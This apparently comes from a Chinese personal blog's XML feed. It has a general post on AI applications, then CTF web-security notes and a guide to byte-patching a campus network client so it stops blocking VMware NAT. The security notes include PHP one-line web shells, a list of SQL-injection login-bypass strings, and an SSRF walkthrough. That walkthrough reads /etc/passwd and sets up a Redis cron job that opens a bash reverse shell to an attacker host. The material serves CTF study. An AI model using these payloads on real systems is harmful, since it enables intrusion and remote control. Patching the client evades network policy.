+<p>​		《人工智能基础（高中版）》教材由华东师范大学慕课中心、商汤科技、上海知名高中优秀教师共同编著。华东师大二附中、上海交通大学附中、清华大学附属中学、上海市市西中学等40所全国学校成为首批“人工智能教育实验基地校”。这是国内中等教育体系首次引入AI教材，人工智能教育在中国正式迈入基础教育阶段。由此人工智能这一当今最前沿的高新技术将走出“象牙塔”，成为每一个在校高中生都可以掌握的基本技能。</p>
+<p>​		本书是面向高中学生的教材，讲授人工智能的发展历史、基本概念以及实际应用，使学生理解人工智能的基本原理，特别是数据、算法与应用之间的相互关系。并结合常见的应用场景，理解人工智能技术（包括感知与决策）的基本工作方式，通过动手实践，更深入地理解人工智能技术的原理、能力，以及在实用中面临的挑战。本书强调人工智能基本理念与原理的传递，注重创造力、想象力、整体思考，以及动手能力的提升。</p>
+<h3 id="人工智能——对话聊天"><a href="#人工智能——对话聊天" class="headerlink" title="人工智能——对话聊天"></a>人工智能——对话聊天</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211206946.png"
+                      alt="image-20240921120619742"
+                ></p>
+<p>​		GPT-4o 的问世再次惊艳了世界，本文深入探讨了 GPT-4o 在语音交互领域的突破性进展，揭示了其在即时性和表现力方面的优势，并对实现这一技术所面临的挑战进行了详细分析。除此之外，作者还对 OpenAI 的发展策略进行了评估，指出了 GPT-4 在逻辑严密性和上下文处理能力上的局限性，并对未来 GPT-5 的发展方向和潜在挑战提出了见解。</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211207350.png"
+                      alt="image-20240921120750291"
+                ></h3><p>​		Siri 是 Speech Interpretation &amp; Recognition Interface 的首字母缩写，原义为<a class="link"   href="https://baike.baidu.com/item/%E8%AF%AD%E9%9F%B3%E8%AF%86%E5%88%AB/10927133?fromModule=lemma_inlink" >语音识别 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>接口，是苹果公司在iPhone、iPad、iPod Touch、HomePod、Apple Watch、Apple TV、Apple CarPlay等产品上应用的一个语音助手，利用Siri用户可以通过手机查找信息、拨打电话、发送信息、获取路线、播放音乐、查找苹果设备等。 </p>
+<p>​		Siri可以支持自然语言输入，并且可以调用系统自带的天气预报、搜索资料等应用，还能够不断学习新的声音和语调，提供对话式的应答。Siri可以令iPhone4S及以上手机（iPad 3以上平板）变身为一台智能化机器人。</p>
+<blockquote>
+<p>以上来自百度百科</p>
+</blockquote>
+<h3 id="人工智能——无人驾驶"><a href="#人工智能——无人驾驶" class="headerlink" title="人工智能——无人驾驶"></a>人工智能——无人驾驶</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211216062.png"
+                      alt="051c228ca721d73099b027b542dba62"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211216030.png"
+                      alt="2a0b25da46151059a2dc6643474901f"
+                ></p>
+<p><a class="link"   href="https://baike.baidu.com/item/%E6%B1%BD%E8%BD%A6%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/0?fromModule=lemma_inlink" >		汽车自动驾驶 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>技术包括<a class="link"   href="https://baike.baidu.com/item/%E8%A7%86%E9%A2%91%E6%91%84%E5%83%8F%E5%A4%B4/0?fromModule=lemma_inlink" >视频摄像头 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、雷达传感器以及<a class="link"   href="https://baike.baidu.com/item/%E6%BF%80%E5%85%89%E6%B5%8B%E8%B7%9D%E5%99%A8/0?fromModule=lemma_inlink" >激光测距器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>来了解周围的交通状况，并通过一个详尽的地图（通过有人驾驶汽车采集的地图）对前方的道路进行<a class="link"   href="https://baike.baidu.com/item/%E5%AF%BC%E8%88%AA/7741941?fromModule=lemma_inlink" >导航 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。这一切都通过谷歌的数据中心来实现，谷歌的数据中心能处理汽车收集的有关周围地形的大量信息。就这点而言，自动驾驶汽车相当于谷歌数据中心的<a class="link"   href="https://baike.baidu.com/item/%E9%81%A5%E6%8E%A7%E6%B1%BD%E8%BD%A6/0?fromModule=lemma_inlink" >遥控汽车 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>或者<a class="link"   href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E6%B1%BD%E8%BD%A6/4771107?fromModule=lemma_inlink" >智能汽车 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。汽车自动驾驶技术<a class="link"   href="https://baike.baidu.com/item/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF/83253?fromModule=lemma_inlink" >物联网技术 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>应用之一。</p>
+<p>沃尔沃根据自动化水平的高低区分了四个无人驾驶的阶段：驾驶辅助、部分自动化、高度自动化、完全自动化。</p>
+<p><a href="https://baike.baidu.com/pic/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%B1%BD%E8%BD%A6/4881925/0/faedab64034f78f014f7bc5679310a55b2191c92?fr=lemma&fromModule=lemma_content-image"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211219450.jpeg"
+                      alt="img"
+                ></a>谷歌自动驾驶汽车示意图</p>
+<p>1、<strong>驾驶辅助系统（DAS）：</strong>目的是为驾驶者提供协助，包括提供重要或有益的驾驶相关信息，以及在形势开始变得危急的时候发出明确而简洁的警告。如“车道偏离警告”（LDW）系统等。</p>
+<p>2、<strong>部分自动化系统：</strong>在驾驶者收到警告却未能及时采取相应行动时能够自动进行干预的系统，如“自动紧急制动”（AEB）系统和“应急车道辅助”（ELA）系统等。</p>
+<p>3、<strong>高度自动化系统：</strong>能够在或长或短的时间段内代替驾驶者承担操控车辆的职责，但是仍需驾驶者对驾驶活动进行监控的系统。</p>
+<p>4、<strong>完全自动化系统：</strong>可无人驾驶车辆、允许车内所有乘员从事其他活动且无需进行监控的系统。这种自动化水平允许乘从事计算机工作、休息和睡眠以及其他娱乐等活动。 [22]</p>
+<blockquote>
+<p>以上来自百度百科</p>
+</blockquote>
+<h3 id="人工智能——形体机器人"><a href="#人工智能——形体机器人" class="headerlink" title="人工智能——形体机器人"></a>人工智能——形体机器人</h3><p>​		人型机器人<strong>（英语：Android），又称</strong>仿生人<strong>，音译</strong>安卓<strong>，是一种旨在模仿<a class="link"   href="https://baike.baidu.com/item/%E4%BA%BA%E7%B1%BB/31910?fromModule=lemma_inlink" >人类 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>外观和行为的<a class="link"   href="https://baike.baidu.com/item/%E6%9C%BA%E5%99%A8%E4%BA%BA/888?fromModule=lemma_inlink" >机器人 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（robot）尤其特指具有和人类相似肌体的种类。直到最近，</strong>人型机器人**的概念还主要停留在科学幻想领域，常见于电影、电视、漫画、小说等。机器人学方面的进展已经可以设计出功能化拟真化的人形机器人（humanoid robot）。</p>
+<p>​		仿生人拟真的程度有很多，有些可以从外观上识别，也没有真人的思想和感情。反过来说亦有开发外观不似人，但能够有似真人行为的机器人，如2001年<a class="link"   href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BD/125486?fromModule=lemma_inlink" >美国 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><a class="link"   href="https://baike.baidu.com/item/%E9%BA%BB%E7%9C%81%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2/117999?fromModule=lemma_inlink" >麻省理工学院 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>研发了号称世界上第一个有类似人类<a class="link"   href="https://baike.baidu.com/item/%E6%84%9F%E6%83%85/236277?fromModule=lemma_inlink" >感情 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的机器人。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211221651.gif"
+                      alt="img"
+                ></p>
+<blockquote>
+<p>来源：Boston Dynamics</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211222539.gif"
+                      alt="img"
+                ></p>
+<blockquote>
+<p>来源：Boston Dynamics</p>
+</blockquote>
+<p>​		机器人展示的酷炫的反向蟹腿技巧。当前大多数工业机器人在出现故障时都需要人工干预，如果机器人跌倒可以自己重新站起来，那么故障的人工干预就会少一些。另一方面，机器人可以通过这个动作简单地掸掉身上的灰尘并重新开始工作，这将给生产力带来大幅提升。</p>
+<h3 id="人工智能——游戏革命"><a href="#人工智能——游戏革命" class="headerlink" title="人工智能——游戏革命"></a>人工智能——游戏革命</h3><p>​		游戏制作公司也全面拥抱AI技术，用AI赋能内容制作工具，不断提升内容研发效率。以腾讯为例，腾讯AI Lab 在GDC 2024 重磅发布了自研游戏全生命周期AI引擎“GiiNEX”，该引擎借助腾讯自研生成式AI和决策AI模型，面向AI驱动的NPC、场景制作、内容生成等领域，可提供包括3D图形、动画、城市及音乐等多种AIGC能力。在GiiNEX引擎助力下，原本需要5天才能完成的城市建模任务，现在只需要25分钟即可完成，效率提升达百倍</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211224206.png"
+                      alt="img"
+                ></p>
+<blockquote>
+<p>来源：腾讯网</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211227624.gif"
+                      alt="WeiXunLian.gif"
+                ></p>
+<blockquote>
+<p>来源：Tencent-github-aitest 平台</p>
+</blockquote>
+<p>aitest平台 是一个基于游戏图像来开发游戏AI的开源工具包。工具包主要完成了UI检测，游戏内元素识别，AI算法(DQN，IM)等功能。可以基于这个工具包完成游戏自动化测试。目前已支持的游戏类型有跑酷类，吃鸡类，射击类，MOBA类等。</p>
+<h3 id="人工智能——人脸识别"><a href="#人工智能——人脸识别" class="headerlink" title="人工智能——人脸识别"></a>人工智能——人脸识别</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211232230.jpeg"
+                      alt="智能化人脸识别情绪管理考勤机将有希望替代人工考勤"
+                ></p>
+<p>​		这张图片展示了人类面部的多个关键部位，包括嘴唇、眉毛、下巴、眼睛等，以及与之相关的基本表情动作，如嘴唇的吸吮、眼睑的紧缩、下巴的抬起等。这些动作不仅构成了我们日常交流的基础，也是我们表达情感状态的重要方式。</p>
+<p>​		图片中还标注了六种基本情绪：平静（CALM）、悲伤（SADNESS）、惊讶（SURPRISE）、愤怒（ANGER）、恐惧（FEAR）和喜悦（JOY）。这些情绪是人类情感的普遍表达，人工智能通过分析这些面部表情来识别和理解人类的情绪状态。</p>
+<p>​		在人工智能领域，这种对面部表情的分析被称为情感识别技术。它利用计算机视觉和机器学习算法来识别和解释人类面部表情，进而推断出个体的情绪。这项技术在多个领域都有广泛的应用，包括心理健康监测、客户服务体验优化、娱乐互动以及安全监控等。</p>
+<p>​		通过这张图片，我们不仅能够直观地看到人工智能如何捕捉和分析人类表情，还能够理解这些技术如何帮助机器更好地与人类互动，提供更加个性化和富有同理心的服务。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211232777.png"
+                      alt="人脸识别原理介绍方案_炫群_展馆设计施工_展示空间创意_数字视觉_北京炫群科技有限公司"
+                ></p>
+<p>​		在人工智能的广泛应用中，面部识别技术正日益成为安全监控和人群管理的关键工具。这张图片展示了一个先进的面部识别系统在远距离工作时的场景，它能够识别并区分多个面孔，无论他们是否正对着摄像头。这种技术的应用场景包括但不限于公共安全、零售环境和企业安全。</p>
+<p>​		图片中标注了几个不同的个体，包括“Ben-客人”、“Tom-VIP”、“Ryan-嫌疑人”、“Peter-员工”、“Kim-员工”、“Lee-客人”和“Sarah-扒手”。这些标签表明系统能够根据预先设定的数据库识别个体的身份，并可能触发相应的安全措施或服务响应。例如，VIP客户可能会自动获得优先服务，而嫌疑人的出现可能会触发警报。</p>
+<p>​		此外，图片还强调了系统在处理不同角度的面孔和在低分辨率情况下工作的能力。特别是提到了“两眼间距离为22像素”，这表明即使在图像质量不佳的情况下，系统也能够准确地识别和分析面部特征。</p>
+<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>​		随着人工智能技术的飞速发展，我们见证了它在各个领域的深远影响。从国家层面的规划到市场的繁荣，人工智能已经成为推动社会进步的关键力量。它不仅改变了我们的工作方式，更在教育领域发挥着重要作用，如将人工智能教材引入高中，培养未来的创新者和思想领袖。</p>
+<p>​		在日常生活中，人工智能的应用更是无处不在。无论是通过对话聊天机器人提供便捷的信息服务，还是通过无人驾驶技术革新交通出行，人工智能都在不断改善我们的生活质量。形体机器人的引入，更是将人工智能的触角延伸到了物理世界，它们在工业、医疗、服务等多个领域展现出巨大的潜力。</p>
+<p>​		游戏领域也因人工智能而焕发新生，它不仅提升了游戏体验，更推动了游戏设计的创新。人脸识别技术的应用，则在安全监控、个性化服务等方面展现出了巨大的价值。</p>
+<p>​		人工智能的浪潮已经到来，它正以前所未有的速度改变着我们的世界。随着技术的不断进步和应用的不断拓展，我们有理由相信，人工智能将继续引领未来的科技革命，为人类社会带来更多的便利和可能。</p>
+<p>​		让我们携手并进，共同迎接人工智能带来的无限可能，探索它为我们打开的新世界。</p>
+]]></content>
+      <categories>
+        <category>AI</category>
+        <category>common</category>
+      </categories>
+      <tags>
+        <tag>AI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2024/09/11/776247657efa/</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>万能登陆密码</title>
+    <url>/2024/09/11/d77af8045ce5/</url>
+    <content><![CDATA[<h1 id="绕过登陆常用万能密码"><a href="#绕过登陆常用万能密码" class="headerlink" title="绕过登陆常用万能密码"></a>绕过登陆常用万能密码</h1><p>所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p>
+<h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">2：&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">3：or 1=1--</span><br><span class="line"></span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">7：&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>admin’or 1&#x3D;1#</p>
+<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><p>admin’&#x2F;*<br>密码*&#x2F;‘<br>‘or 1&#x3D;1&#x2F;*</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&quot;or1=1--</span><br><span class="line"></span><br><span class="line">&quot;or=or&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line"></span><br><span class="line">&#x27;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27; &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or1=1--</span><br><span class="line"></span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27;1=1--</span><br><span class="line"></span><br><span class="line">or &#x27;a&#x27;=&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">or 1=1--</span><br><span class="line"></span><br><span class="line">or1=1--</span><br></pre></td></tr></table></figure></div>
+
+
+
+]]></content>
+      <categories>
+        <category>common</category>
+      </categories>
+      <tags>
+        <tag>common</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>服务器请求伪造（SSRF）</title>
+    <url>/2024/09/11/fdbfb64754f6/</url>
+    <content><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
+<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
+<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
+<ul>
+<li>读取内网文件;</li>
+<li>扫描内网服务和端口;</li>
+<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
+<li>攻击运行在内网的系统或应用程序.</li>
+</ul>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
+<p><strong>web功能</strong></p>
+<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
+<ol>
+<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
+<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
+<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
+<li>图片加载与下载:通过URL地址加载或下载图片。</li>
+<li>通过api获取远程地址文件来加载内容。</li>
+</ol>
+<p><strong>URL关键字</strong></p>
+<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
+<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
+<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
+<p><strong>重要文件：</strong></p>
+<ol>
+<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
+<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
+<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
+</ol>
+<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
+<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
+<ol>
+<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
+</li>
+<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
+</li>
+</ol>
+<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
+<p>同样可以利用Burp进行爆破</p>
+<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
+<p><strong>攻击payload:</strong></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
+
+<p>然后攻击机进行监听</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
+
+<p>定时任务执行后就会反弹shell到攻击机</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
+    <url>/2024/09/21/7d3ba1c32839/</url>
+    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
+<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
+<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
+<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
+<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
+<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
+                      alt="image-20240921185459092"
+                ></p>
+<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
+                      alt="image-20240921185425761"
+                ></p>
+<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
+                      alt="image-20240921185659129"
+                ></p>
+<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
+                      alt="image-20240921191031242"
+                ></p>
